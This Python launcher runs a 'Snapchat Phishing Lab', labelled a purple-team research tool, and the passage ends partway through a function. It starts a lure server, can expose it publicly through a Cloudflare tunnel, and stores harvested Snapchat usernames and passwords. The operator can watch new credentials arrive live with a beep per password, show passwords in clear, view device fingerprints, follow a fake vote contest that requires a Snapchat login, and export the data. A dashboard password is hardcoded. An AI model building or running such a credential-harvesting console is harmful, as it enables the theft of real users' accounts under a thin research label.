"""
╔══════════════════════════════════════════════════════════════╗
║  Snapchat Phishing Lab — Purple Team Launcher               ║
║  Usage: python launcher.py                                   ║
╚══════════════════════════════════════════════════════════════╝
"""
import os, sys, json, sqlite3, time, threading, socket, webbrowser, subprocess, re, shutil, urllib.request, ssl
from datetime import datetime
from io import StringIO
import csv
from app.crypto import decrypt_password

BASE = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE, "captured_credentials.db")
CF_PATH = os.path.join(BASE, "cloudflared.exe")
ADMIN_KEY_FILE = os.path.join(BASE, ".admin_key")
ACCESS_PW = os.environ.get("SNAPCHAT_LAB_DASHBOARD_PW", "76247010aidafamoussa")

sys.path.insert(0, BASE)

# ── Rich imports ──
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.prompt import Prompt, Confirm
    from rich.text import Text
    from rich.columns import Columns
    from rich.align import Align
    from rich.box import DOUBLE, ROUNDED, HEAVY, MINIMAL, SQUARE
    from rich.style import Style
    from rich.spinner import Spinner
    from rich.syntax import Syntax
    from rich.markdown import Markdown
    from rich.traceback import install as install_rich_tb
    install_rich_tb()
    RICH_OK = True
except ImportError:
    RICH_OK = False

# ── Fallback colors ──
try:
    from colorama import init, Fore, Style as CStyle
    init()
    R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN
    M = Fore.MAGENTA; B = Fore.BLUE; W = Fore.WHITE; X = CStyle.RESET_ALL; D = CStyle.DIM
except ImportError:
    class _F:
        def __getattr__(self, n): return ''
    Fore = _F()
    R=G=Y=C=M=B=W=X=D=''

# ── Console ──
console = Console() if RICH_OK else None

# ── Logo ASCII ──
LOGO_RAW = """\
╔═══════════════════════════════════════════╗
║                                           ║
║               █████  █   █                ║
║               █      ██ ██                ║
║               █████  █ █ █                ║
║               █      █   █                ║
║               █      █   █                ║
║                                           ║
║            █████  █   █  █████             ║
║            █      ██  █  █                 ║
║            █████  █ █ █  █ ███             ║
║                █  █  ██  █   █            ║
║            █████  █   █  █████             ║
║                                           ║
╚═══════════════════════════════════════════╝"""

TAGLINE = "FM_SNG  •  Purple Team  •  Research Tool  •  Ethical Phishing Study"

# ── Globals ──
flask_thread = None
FLASK_USE_SSL = True
cf_thread = None
cf_url = None
cf_proc = None
WATCH_ACTIVE = False
CONFIG_CACHE = {}

try:
    import winsound
    HAS_WINSOUND = True
except:
    HAS_WINSOUND = False

# ══════════════════════════════════════════════════════════════
#  RICH SHORTHANDS
# ══════════════════════════════════════════════════════════════

def panic(text):
    if RICH_OK:
        console.print(Panel(f"[bold red]{text}[/]", border_style="red"))
    else:
        print(f"  {R}{text}{X}")

def okay(text):
    if RICH_OK:
        console.print(Panel(f"[bold green]{text}[/]", border_style="green"))
    else:
        print(f"  {G}✓ {text}{X}")

def info(text):
    if RICH_OK:
        console.print(f"[cyan]●[/] {text}")
    else:
        print(f"  {C}● {text}{X}")

def warn(text):
    if RICH_OK:
        console.print(f"[yellow]⚠[/] {text}")
    else:
        print(f"  {Y}⚠ {text}{X}")

def dim(text):
    if RICH_OK:
        console.print(f"[dim]{text}[/]")
    else:
        print(f"  {D}{text}{X}")

def divider():
    if RICH_OK:
        console.rule(style="dim")
    else:
        print(f"  {D}{'─' * 60}{X}")

def pause():
    if RICH_OK:
        Prompt.ask("[dim]Appuie sur [bold]Entrée[/] pour continuer[/]")
    else:
        input(f"\n  {D}[Appuie sur Entrée]{X}")

def confirm_action(msg="Confirmer ?"):
    if RICH_OK:
        return Confirm.ask(f"[yellow]{msg}[/]")
    else:
        r = input(f"  {Y}{msg} (o/N) >{X} ").strip().lower()
        return r in ('o', 'oui', 'y', 'yes')

# ══════════════════════════════════════════════════════════════
#  LOGO
# ══════════════════════════════════════════════════════════════

def show_logo():
    if RICH_OK:
        console.clear()
        logo_text = Text()
        colors = ["yellow", "bright_yellow", "green", "cyan", "blue", "magenta"]
        for i, line in enumerate(LOGO_RAW.split('\n')):
            logo_text.append(line + "\n", style=colors[i % len(colors)])
        console.print(Align.center(Panel(logo_text, border_style="cyan", box=HEAVY)))
        console.print(Align.center(f"[dim]{TAGLINE}[/]"))
        console.print()
    else:
        cls()
        print()
        print(f"{Y}{LOGO_RAW}{X}")
        print()
        print(f"  {D}{'─' * 60}{X}")
        print(f"  {C}  Snapchat Phishing Lab{X}  -  {M}Purple Team Research{X}")
        print(f"  {D}{'─' * 60}{X}")
        print()

# ══════════════════════════════════════════════════════════════
#  DB HELPERS
# ══════════════════════════════════════════════════════════════

def db():
    return sqlite3.connect(DB_PATH, timeout=10)

def db_stats():
    try:
        conn = db()
        caps = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
        with_pw = conn.execute("SELECT COUNT(*) FROM captured_credentials WHERE password != '' AND password IS NOT NULL").fetchone()[0]
        sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
        voters = conn.execute("SELECT COUNT(DISTINCT participant_id) FROM votes_top3 WHERE snap_validated=1").fetchone()[0]
        conn.close()
        return caps, with_pw, sessions, voters
    except:
        return 0, 0, 0, 0

def admin_key():
    try:
        if os.path.exists(ADMIN_KEY_FILE):
            with open(ADMIN_KEY_FILE) as f:
                return f.read().strip()
    except:
        pass
    return None

# ══════════════════════════════════════════════════════════════
#  TITLE BAR
# ══════════════════════════════════════════════════════════════

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def build_status_bar():
    k = admin_key()
    caps, wpw, sess, voters = db_stats()
    running = is_server_running()
    tunnel = cf_url or None

    if not RICH_OK:
        status = f"{G}● UP{X}" if running else f"{R}● DOWN{X}"
        caps_str = f"{W}{caps}{X}" if caps > 0 else f"{D}0{X}"
        pw_str = f"{G}{wpw}{X}" if wpw > 0 else f"{D}0{X}"
        bar = f"  {C}SERVER{X} {status}  "
        if running:
            bar += f"| {C}Captures{X} {caps_str}  | {G}PW{X} {pw_str}  | {C}Sessions{X} {sess}  | {M}Votants{X} {voters}"
        if tunnel:
            bar += f"  |  {Y}Tunnel{X} {tunnel[:45]}"
        print(f"  {D}{'─' * 78}{X}")
        print(bar)
        print(f"  {D}{'─' * 78}{X}")
        return

    parts = []
    status_str = "[bold green]● UP[/]" if running else "[bold red]● DOWN[/]"
    srv = f"[cyan]SERVER[/] {status_str}"
    if running:
        stats = f"[cyan]Captures[/] [white]{caps}[/]  [green]PW[/] [white]{wpw}[/]  [cyan]Sessions[/] [white]{sess}[/]  [magenta]Votants[/] [white]{voters}[/]"
        parts = [srv, stats]
    else:
        parts = [srv]
    if tunnel:
        parts.append(f"[yellow]Tunnel[/] [dim]{tunnel[:45]}[/]")

    divider_text = "  │  ".join(parts)
    console.rule(style="dim")
    console.print(f"  {divider_text}")
    console.rule(style="dim")

# ══════════════════════════════════════════════════════════════
#  SERVER
# ══════════════════════════════════════════════════════════════

def is_server_running():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(1)
        from main import CONFIG as _cfg
        port = _cfg.get("SERVER_PORT", 8080)
        s.connect(("127.0.0.1", port))
        return True
    except:
        return False
    finally:
        s.close()

def server_url():
    global FLASK_USE_SSL
    try:
        from main import CONFIG as _cfg
        proto = "https" if FLASK_USE_SSL else "http"
        port = _cfg.get("SERVER_PORT", 8080)
    except:
        proto = "http"
        port = 8080
    return f"{proto}://localhost:{port}"

def start_flask():
    global FLASK_USE_SSL
    os.environ["PYTHONIOENCODING"] = "utf-8"
    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    from main import app, init_database, CONFIG
    init_database()
    ssl_ctx = None if not FLASK_USE_SSL else ('adhoc' if CONFIG.get("USE_HTTPS") else None)
    port = CONFIG.get("SERVER_PORT", 8080)
    app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False, ssl_context=ssl_ctx)

def start_server():
    global flask_thread
    if is_server_running():
        return True
    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    with _spinner("Démarrage du serveur...") as _:
        for _ in range(20):
            if is_server_running():
                return True
            time.sleep(0.3)
    return False

def stop_server():
    try:
        import requests
        requests.post(f"{server_url()}/shutdown", timeout=2)
    except:
        pass

# ══════════════════════════════════════════════════════════════
#  SPINNER CONTEXT
# ══════════════════════════════════════════════════════════════

def _spinner(text):
    if RICH_OK:
        return console.status(f"[cyan]{text}[/]", spinner="dots")
    else:
        class FakeSpinner:
            def __enter__(self): print(f"  {C}{text}{X}", end='', flush=True); return self
            def __exit__(self, *a): print()
        return FakeSpinner()

def _progress(description, steps=1):
    if RICH_OK:
        progress = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
        )
        task = progress.add_task(description, total=steps)
        return progress, task
    else:
        return None, None

def _advance(progress, task, amount=1):
    if progress:
        progress.update(task, advance=amount)

def _complete(progress, task):
    if progress:
        progress.update(task, completed=100)

# ══════════════════════════════════════════════════════════════
#  CLOUDFLARE TUNNEL
# ══════════════════════════════════════════════════════════════

def download_cloudflared():
    if os.path.exists(CF_PATH):
        return True
    info("Téléchargement de cloudflared...")
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    try:
        urllib.request.urlretrieve(url, CF_PATH)
        okay("Cloudflared téléchargé")
        return True
    except Exception as e:
        panic(f"Échec téléchargement cloudflared : {e}")
        return False

def start_tunnel():
    global cf_url, cf_proc, cf_thread
    cf_url = None
    if not os.path.exists(CF_PATH):
        if not download_cloudflared():
            return None
    cf_thread = threading.Thread(target=_run_tunnel, daemon=True)
    cf_thread.start()
    with _spinner("Connexion au tunnel Cloudflare...") as _:
        for _ in range(45):
            if cf_url:
                return cf_url
            time.sleep(0.4)
    return None

def _run_tunnel():
    global cf_url, cf_proc
    try:
        from main import CONFIG as _cfg
        port = _cfg.get("SERVER_PORT", 8080)
        proc = subprocess.Popen(
            [CF_PATH, "tunnel", "--url", f"http://127.0.0.1:{port}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        cf_proc = proc
        if not proc.stdout:
            return
        for line in iter(proc.stdout.readline, b''):
            text = line.decode("utf-8", errors="replace").strip()
            m = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', text)
            if m:
                cf_url = m.group(0)
    except:
        pass

def stop_tunnel():
    global cf_proc, cf_url
    if cf_proc:
        try:
            cf_proc.terminate()
            cf_proc.wait(timeout=5)
        except:
            try: cf_proc.kill()
            except: pass
        cf_proc = None
    cf_url = None

# ══════════════════════════════════════════════════════════════
#  MENU — MAIN
# ══════════════════════════════════════════════════════════════

def show_menu_rich():
    console.print()
    grid = Table.grid(padding=(0, 2))
    grid.add_column(justify="left", style="cyan")
    grid.add_column()

    grid.add_row("", "[bold white]MENU PRINCIPAL[/]")
    grid.add_row("", "")
    grid.add_row("[bold magenta][1][/]", "Démarrer le serveur")
    grid.add_row("[bold magenta][2][/]", "Démarrer + tunnel Cloudflare")
    grid.add_row("", "")
    grid.add_row("[bold cyan][3][/]", "Dashboard interactif")
    grid.add_row("[bold cyan][4][/]", "Watch Live (flux temps réel)")
    grid.add_row("", "")
    grid.add_row("[bold magenta][5][/]", "🎯 Lancer une campagne")
    grid.add_row("", "")
    grid.add_row("[bold yellow][6][/]", "Exporter les données")
    grid.add_row("[bold yellow][7][/]", "Ouvrir dans le navigateur")
    grid.add_row("[bold yellow][8][/]", "Vérifier la base de données")
    grid.add_row("", "")
    grid.add_row("[bold red][9][/]", "Réinitialiser toutes les données")
    grid.add_row("", "")
    grid.add_row("[bold dim][0][/]", "[dim]Quitter[/]")

    console.print(Panel(grid, border_style="cyan", box=ROUNDED))
    c = Prompt.ask("[bold green]└─>[/]", default="")
    return c.strip()

def show_menu_fallback():
    print(f"  {C}╔══════════════════════════════════════════════╗{X}")
    print(f"  {C}║              MENU PRINCIPAL                 ║{X}")
    print(f"  {C}╚══════════════════════════════════════════════╝{X}")
    print()
    print(f"    {M}[1]{X}  Démarrer le serveur")
    print(f"    {M}[2]{X}  Démarrer avec tunnel Cloudflare")
    print()
    print(f"    {C}[3]{X}  Dashboard interactif")
    print(f"    {C}[4]{X}  Surveillance en direct (Watch Live)")
    print()
    print(f"    {M}[5]{X}  🎯 Lancer une campagne")
    print()
    print(f"    {Y}[6]{X}  Exporter les données")
    print(f"    {Y}[7]{X}  Ouvrir dans le navigateur")
    print(f"    {Y}[8]{X}  Vérifier la base de données")
    print()
    print(f"    {R}[9]{X}  Réinitialiser toutes les données")
    print()
    print(f"    {D}[0]{X}  Quitter")
    print()
    return input(f"  {G}└─>{X} ").strip()

# ══════════════════════════════════════════════════════════════
#  ACTIONS
# ══════════════════════════════════════════════════════════════

def action_1_start():
    global FLASK_USE_SSL
    stop_tunnel()
    show_logo()
    FLASK_USE_SSL = True
    info("Démarrage du serveur...")
    if not is_server_running():
        stop_server()
        time.sleep(0.5)
    if start_server():
        okay(f"Serveur actif : [link={server_url()}]{server_url()}[/]")
    else:
        panic("Échec du démarrage du serveur")
    pause()

def action_2_tunnel():
    global FLASK_USE_SSL
    show_logo()
    if not os.path.exists(CF_PATH):
        warn("Cloudflared non trouvé. Téléchargement...")
        if not download_cloudflared():
            pause()
            return
    stop_tunnel()
    if is_server_running():
        stop_server()
        time.sleep(1)
    FLASK_USE_SSL = False
    if not start_server():
        panic("Le serveur n'a pas démarré")
        FLASK_USE_SSL = True
        pause()
        return
    info("Démarrage du tunnel Cloudflare...")
    url = start_tunnel()
    if url:
        okay(f"Tunnel actif : [link={url}]{url}[/]")
    else:
        panic("Le tunnel n'a pas pu être créé")
    pause()

def action_3_dashboard():
    show_logo()
    if not is_server_running():
        warn("Le serveur n'est pas en cours d'exécution")
        info("Utilise [1] ou [2] pour démarrer")
        pause()
        return
    p = Prompt.ask("[yellow]Mot de passe dashboard[/]", password=True) if RICH_OK else input(f"  {Y}Mot de passe dashboard >{X} ")
    if p != ACCESS_PW:
        panic("Accès refusé")
        time.sleep(1)
        pause()
        return
    terminal_dashboard()

def action_4_watch():
    show_logo()
    if not is_server_running():
        warn("Le serveur n'est pas en cours d'exécution")
        info("Utilise [1] ou [2] pour démarrer")
        pause()
        return
    watch_live()

def action_5_export():
    show_logo()
    if not is_server_running():
        warn("Le serveur n'est pas en cours d'exécution")
        pause()
        return
    export_menu()

def action_6_browser():
    show_logo()
    if not is_server_running():
        warn("Le serveur n'est pas en cours d'exécution")
        pause()
        return
    target = cf_url if cf_url else server_url()
    webbrowser.open(target)
    okay(f"Ouverture : {target}")
    pause()

def action_7_dbcheck():
    show_logo()
    if not is_server_running():
        warn("Le serveur n'est pas en cours d'exécution")
        pause()
        return
    ctx = ssl._create_unverified_context()
    try:
        r = urllib.request.urlopen(f"{server_url()}/api/dbcheck", context=ctx, timeout=5)
        d = json.loads(r.read())
        caps, wpw, sessions, voters = db_stats()
        bp = os.path.join(BASE, "backups")
        bk_count = len([f for f in os.listdir(bp) if f.endswith('.db')]) if os.path.exists(bp) else 0

        if RICH_OK:
            tbl = Table(box=MINIMAL, border_style="cyan")
            tbl.add_column("Métrique", style="cyan")
            tbl.add_column("Valeur")
            tbl.add_row("Chemin DB", d.get('db_path','?'))
            tbl.add_row("Existante", "Oui" if d.get('db_exists') else "Non")
            tbl.add_row("Captures", f"[green]{d.get('total_captures',0)}[/]")
            tbl.add_row("Avec mot de passe", f"[green]{wpw}[/]")
            tbl.add_row("Logs", str(d.get('total_logs',0)))
            tbl.add_row("Sessions", str(sessions))
            tbl.add_row("Votants validés", f"[magenta]{voters}[/]")
            tbl.add_row("Sauvegardes", f"[dim]{bk_count} fichier(s)[/]")
            console.print(Panel(tbl, title="[cyan]Base de données[/]", border_style="cyan"))
        else:
            print(f"  {C}Base de données :{X}")
            print(f"    {C}Chemin :{X}       {d.get('db_path','?')}")
            print(f"    {C}Existante :{X}     {'Oui' if d.get('db_exists') else 'Non'}")
            print(f"    {G}Captures :{X}      {d.get('total_captures',0)}")
            print(f"    {G}Avec mot de passe :{X} {wpw}")
            print(f"    {C}Logs :{X}          {d.get('total_logs',0)}")
            print(f"    {C}Sessions :{X}       {sessions}")
            print(f"    {M}Votants :{X}        {voters}")
            print(f"    {D}Sauvegardes :{X}    {bk_count} fichier(s)")
    except Exception as e:
        panic(f"Erreur : {e}")
    pause()

def action_8_reset():
    show_logo()
    if RICH_OK:
        console.print(Panel(
            "[bold red]⚠  SUPPRESSION TOTALE DES DONNÉES  ⚠[/]\n\n"
            "[yellow]Cette action supprime toutes les captures, logs et votes.[/]\n"
            "[dim]Une sauvegarde sera créée automatiquement avant la suppression.[/]",
            border_style="red", box=HEAVY
        ))
    else:
        print(f"  {R}⚠  SUPPRESSION TOTALE DES DONNÉES  ⚠{X}")
        print(f"  {Y}Cette action supprime toutes les captures, logs et votes.{X}")

    if not confirm_action("Taper 'SUPPRIMER' pour confirmer"):
        warn("Annulé")
        pause()
        return

    if not (RICH_OK and Confirm.ask("[red]Vraiment ? Cette action est irréversible ![/]")):
        if not RICH_OK:
            c = input(f"  {R}Vraiment irréversible. Continuer ? (o/N) >{X} ").strip().lower()
            if c not in ('o', 'oui'):
                warn("Annulé")
                pause()
                return

    with _spinner("Sauvegarde et suppression..."):
        try:
            backup_dir = os.path.join(BASE, "backups")
            os.makedirs(backup_dir, exist_ok=True)
            if os.path.exists(DB_PATH):
                bname = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
                shutil.copy2(DB_PATH, os.path.join(backup_dir, bname))
        except Exception as e:
            warn(f"Sauvegarde échouée : {e}")
        conn = db()
        conn.execute("DELETE FROM captured_credentials")
        conn.execute("DELETE FROM experiment_log")
        conn.execute("DELETE FROM votes_top3")
        conn.commit()
        conn.close()
    okay("Toutes les données ont été supprimées")
    dim("Les votes du Classement Secret ont aussi été réinitialisés")
    pause()

# ══════════════════════════════════════════════════════════════
#  WATCH LIVE
# ══════════════════════════════════════════════════════════════

def watch_live():
    global WATCH_ACTIVE
    last_id, last_vote_id = 0, 0
    try:
        conn = db()
        last_id = conn.execute("SELECT COALESCE(MAX(id),0) FROM captured_credentials").fetchone()[0]
        last_vote_id = conn.execute("SELECT COALESCE(MAX(id),0) FROM votes_top3").fetchone()[0]
        conn.close()
    except:
        pass

    show_logo()
    if RICH_OK:
        console.print(Panel(
            "[bold green]WATCH LIVE — Surveillance en temps réel[/]\n"
            "[dim]Nouveaux credentials et votes s'affichent ici. Ctrl+C pour arrêter.[/]",
            border_style="green", box=ROUNDED
        ))
    else:
        print(f"  {G}[WATCH LIVE]{X} Surveillance en temps réel")
        print(f"  {D}Nouveaux credentials et votes s'affichent ici. Ctrl+C pour arrêter.{X}")
    print()

    WATCH_ACTIVE = True
    try:
        while WATCH_ACTIVE:
            time.sleep(1.5)
            conn = db()
            rows = conn.execute(
                "SELECT id, step, username, password, timestamp FROM captured_credentials WHERE id > ? ORDER BY id",
                (last_id,)
            ).fetchall()
            votes = conn.execute(
                "SELECT id, pseudo, snap_validated, created_at FROM votes_top3 WHERE id > ? ORDER BY id",
                (last_vote_id,)
            ).fetchall()
            conn.close()

            if RICH_OK:
                for r in rows:
                    user = r[2] or "-"
                    pw = r[3] if r[3] else "-"
                    step = r[1] or "?"
                    ts = r[4][11:19] if r[4] else "--:--:--"
                    has_pw = bool(pw and pw != "-")
                    label = "[bold green]CAPTURE[/]" if has_pw else "[yellow]LOGIN[/]"
                    style = "green" if has_pw else "yellow"
                    console.print(f"  [dim]{ts}[/] {label} [bold]#{r[0]}[/bold] [{step}] [white]{user}[/] / [bold {style}]{pw}[/]")
                    if has_pw:
                        if HAS_WINSOUND:
                            winsound.Beep(880, 200)
                        else:
                            console.print("  \a", end='')
                    last_id = r[0]
                for v in votes:
                    ts = v[3][11:19] if v[3] else "--:--:--"
                    val = "[green]VALIDÉ[/]" if v[2] else "[yellow]EN ATTENTE[/]"
                    console.print(f"  [dim]{ts}[/] [magenta]VOTE[/]   #{v[0]} [cyan]{v[1]}[/] → {val}")
                    last_vote_id = v[0]
            else:
                for r in rows:
                    user = r[2] or "-"
                    pw = r[3] if r[3] else "-"
                    step = r[1] or "?"
                    ts = r[4][11:19] if r[4] else "--:--:--"
                    label = f"{G}CAPTURE{X}" if pw and pw != "-" else f"{Y}LOGIN{X}"
                    print(f"  {D}{ts}{X} {label} #{r[0]} [{step:<8}] {user} / {pw}")
                    if pw and pw != "-":
                        if HAS_WINSOUND:
                            winsound.Beep(880, 200)
                        else:
                            print("  \a", end='', flush=True)
                    last_id = r[0]
                for v in votes:
                    ts = v[3][11:19] if v[3] else "--:--:--"
                    val = f"{G}VALIDÉ{X}" if v[2] else f"{Y}EN ATTENTE{X}"
                    print(f"  {D}{ts}{X} {M}VOTE{X}   #{v[0]} {v[1]} → {val}")
                    last_vote_id = v[0]
    except KeyboardInterrupt:
        pass
    WATCH_ACTIVE = False
    info("Surveillance arrêtée.")
    pause()

# ══════════════════════════════════════════════════════════════
#  EXPORT
# ══════════════════════════════════════════════════════════════

def export_menu():
    show_logo()
    if RICH_OK:
        grid = Table.grid(padding=(0, 2))
        grid.add_column(justify="left", style="cyan")
        grid.add_column()
        grid.add_row("", "[bold white]EXPORTER LES DONNÉES[/]")
        grid.add_row("", "")
        grid.add_row("[white][1][/]", "JSON")
        grid.add_row("[white][2][/]", "CSV")
        grid.add_row("[white][3][/]", "Rapport HTML")
        grid.add_row("", "")
        grid.add_row("[dim][0][/]", "[dim]Retour[/]")
        console.print(Panel(grid, border_style="yellow", box=ROUNDED))
        c = Prompt.ask("[bold green]└─>[/]", default="").strip()
    else:
        print(f"  {C}Exporter les données{X}")
        print()
        print(f"    {W}[1]{X} JSON")
        print(f"    {W}[2]{X} CSV")
        print(f"    {W}[3]{X} Rapport HTML")
        print(f"    {D}[0]{X} Retour")
        print()
        c = input(f"  {G}└─>{X} ").strip()

    k = admin_key()
    if not k:
        panic("Clé admin introuvable")
        pause()
        return
    ctx = ssl._create_unverified_context()
    base_url = server_url()
    now = datetime.now().strftime('%Y%m%d_%H%M%S')

    if c == "1":
        with _spinner("Export JSON..."):
            try:
                r = urllib.request.urlopen(f"{base_url}/export?key={k}", context=ctx, timeout=10)
                data = r.read().decode()
                path = os.path.join(BASE, f"export_{now}.json")
                with open(path, "w", encoding="utf-8") as f:
                    f.write(data)
                okay(f"Exporté : {path} ({len(data)} octets)")
            except Exception as e:
                panic(f"Erreur : {e}")
    elif c == "2":
        with _spinner("Export CSV..."):
            try:
                r = urllib.request.urlopen(f"{base_url}/export/csv?key={k}", context=ctx, timeout=10)
                data = r.read().decode('utf-8-sig')
                path = os.path.join(BASE, f"export_{now}.csv")
                with open(path, "w", encoding="utf-8-sig") as f:
                    f.write(data)
                okay(f"Exporté : {path} ({len(data)} octets)")
            except Exception as e:
                panic(f"Erreur : {e}")
    elif c == "3":
        with _spinner("Génération du rapport HTML..."):
            try:
                r = urllib.request.urlopen(f"{base_url}/export/report?key={k}", context=ctx, timeout=10)
                data = r.read().decode()
                path = os.path.join(BASE, f"report_{now}.html")
                with open(path, "w", encoding="utf-8") as f:
                    f.write(data)
                okay(f"Exporté : {path} ({len(data)} octets)")
            except Exception as e:
                panic(f"Erreur : {e}")
    elif c == "0":
        return
    pause()

# ══════════════════════════════════════════════════════════════
#  TERMINAL DASHBOARD
# ══════════════════════════════════════════════════════════════

def terminal_dashboard():
    while True:
        if RICH_OK:
            console.clear()
            logo_text = Text()
            colors = ["yellow", "bright_yellow", "green", "cyan", "blue", "magenta"]
            for i, line in enumerate(LOGO_RAW.split('\n')):
                logo_text.append(line + "\n", style=colors[i % len(colors)])
            console.print(Align.center(Panel(logo_text, border_style="cyan", box=HEAVY)))
        else:
            cls()
            print(LOGO_RAW)
        build_status_bar()

        if RICH_OK:
            grid = Table.grid(padding=(0, 2))
            grid.add_column(justify="left", style="cyan")
            grid.add_column()
            grid.add_row("", "[bold white]DASHBOARD INTERACTIF[/]")
            grid.add_row("", "")
            grid.add_row("[bold cyan]STATISTIQUES[/]")
            grid.add_row("[white][1][/]", "Vue d'ensemble")
            grid.add_row("[white][2][/]", "Credentials (masqués)")
            grid.add_row("[white][3][/]", "Credentials (mots de passe visibles)")
            grid.add_row("[white][4][/]", "Logs d'activité")
            grid.add_row("[white][5][/]", "Empreintes numériques")
            grid.add_row("", "")
            grid.add_row("[bold magenta]CLASSEMENT SECRET[/]")
            grid.add_row("[white][6][/]", "Voir les votes et le classement")
            grid.add_row("", "")
            grid.add_row("[bold yellow]EXPORT / ACTIONS[/]")
            grid.add_row("[white][7][/]", "Exporter")
            grid.add_row("[bold red][8][/]", "Réinitialiser")
            grid.add_row("", "")
            grid.add_row("[dim][0][/]", "[dim]Retour au menu principal[/]")
            console.print(Panel(grid, border_style="cyan", box=ROUNDED))
            c = Prompt.ask("[bold green]└─>[/]", default="").strip()
        else:
            print(f"  {C}╔{'═'*46}╗{X}")
            print(f"  {C}║            DASHBOARD INTERACTIF            ║{X}")
            print(f"  {C}╚{'═'*46}╝{X}")
            print()
            print(f"    {C}STATISTIQUES{X}")
            print(f"    {W}[1]{X}  Vue d'ensemble")
            print(f"    {W}[2]{X}  Credentials (masqués)")
            print(f"    {W}[3]{X}  Credentials (mots de passe visibles)")
            print(f"    {W}[4]{X}  Logs d'activité")
            print(f"    {W}[5]{X}  Empreintes numériques (fingerprints)")
            print()
            print(f"    {M}CLASSEMENT SECRET{X}")
            print(f"    {W}[6]{X}  Voir les votes et le classement")
            print()
            print(f"    {Y}EXPORT / ACTIONS{X}")
            print(f"    {W}[7]{X}  Exporter")
            print(f"    {R}[8]{X}  Réinitialiser")
            print()
            print(f"    {D}[0]{X}  Retour au menu principal")
            print()
            c = input(f"  {G}└─>{X} ").strip()
        if c == "1": td_stats()
        elif c == "2": td_creds(False)
        elif c == "3": td_creds(True)
        elif c == "4": td_logs()
        elif c == "5": td_fingerprints()
        elif c == "6": td_votes()
        elif c == "7": export_menu()
        elif c == "8": action_8_reset()
        elif c == "0": break

def td_table_rich(headers, rows):
    tbl = Table(box=SQUARE, border_style="cyan", header_style="bold cyan")
    for h in headers:
        tbl.add_column(h)
    for row in rows:
        tbl.add_row(*[str(c) for c in row])
    console.print(tbl)

def td_table(headers, rows):
    cols = len(headers)
    cw = [max(len(h), max((len(str(r[i])) for r in rows), default=0)) for i, h in enumerate(headers)]
    print("  " + " + ".join("=" * cw[i] for i in range(cols)))
    print("  " + " | ".join(h.ljust(cw[i]) for i, h in enumerate(headers)))
    print("  " + " + ".join("=" * cw[i] for i in range(cols)))
    for r in rows:
        print("  " + " | ".join(str(r[i]).ljust(cw[i]) for i in range(cols)))
    print("  " + " + ".join("=" * cw[i] for i in range(cols)))

def td_stats():
    if RICH_OK:
        console.clear()
        console.print(Align.center(Panel(Text(LOGO_RAW, style="cyan"), border_style="cyan", box=HEAVY)))
    else:
        cls(); print(LOGO_RAW)
    build_status_bar()
    conn = db()
    total = conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    with_pw = conn.execute("SELECT COUNT(*) FROM captured_credentials WHERE password != '' AND password IS NOT NULL").fetchone()[0]
    sessions = conn.execute("SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'").fetchone()[0]
    unique = conn.execute("SELECT COUNT(DISTINCT participant_id) FROM captured_credentials").fetchone()[0]
    daily = conn.execute("SELECT DATE(timestamp), COUNT(*) FROM captured_credentials GROUP BY DATE(timestamp) ORDER BY DATE(timestamp) DESC LIMIT 7").fetchall()
    voters = conn.execute("SELECT COUNT(DISTINCT participant_id) FROM votes_top3 WHERE snap_validated=1").fetchone()[0]
    votes_count = conn.execute("SELECT COUNT(*) FROM votes_top3").fetchone()[0]
    conn.close()

    conv = f"{round(total/sessions*100,1)}%" if sessions else "0%"

    if RICH_OK:
        kpi = Table.grid(padding=(2, 4))
        kpi.add_row(
            Panel(f"[bold cyan]{total}[/]", title="Captures", border_style="cyan"),
            Panel(f"[bold green]{with_pw}[/]", title="PW capturés", border_style="green"),
            Panel(f"[bold yellow]{sessions}[/]", title="Sessions", border_style="yellow"),
            Panel(f"[bold magenta]{voters}[/]", title="Votants", border_style="magenta"),
        )
        console.print(kpi)
        console.print(f"[bold cyan]CONVERSION :[/] [white]{conv}[/]  |  [cyan]Pseudo uniques :[/] [white]{unique}[/]")
    else:
        print(f"  {C}STATISTIQUES{X}")
        td_table(
            ["Sessions", "Captures", "PW capturés", "Uniques", "Conversion", "Votants"],
            [[sessions, total, with_pw, unique, conv, f"{M}{voters}{X}"]]
        )

    if daily:
        if RICH_OK:
            console.print("\n[bold]Derniers 7 jours :[/]")
            mx = max(d[1] for d in daily) if daily else 1
            for d, cnt in daily:
                bar = "█" * max(1, int(cnt / mx * 30))
                console.print(f"  [dim]{d}[/] [green]{bar}[/] [white]({cnt})[/]")
        else:
            print(f"\n  {D}Derniers 7 jours :{X}")
            mx = max(d[1] for d in daily) if daily else 1
            for d, cnt in daily:
                bar = "#" * max(1, int(cnt / mx * 30))
                print(f"    {d}  {G}{bar}{X} ({cnt})")

    if votes_count > 0:
        if RICH_OK:
            console.print(f"\n[magenta]Classement Secret :[/] {votes_count} vote(s) dont {voters} validé(s)")
        else:
            print(f"\n  {M}Classement Secret : {votes_count} vote(s) dont {voters} validé(s){X}")

    pause()

def td_creds(show_pw):
    if RICH_OK:
        console.clear()
        console.print(Align.center(Panel(Text(LOGO_RAW, style="cyan"), border_style="cyan", box=HEAVY)))
    else:
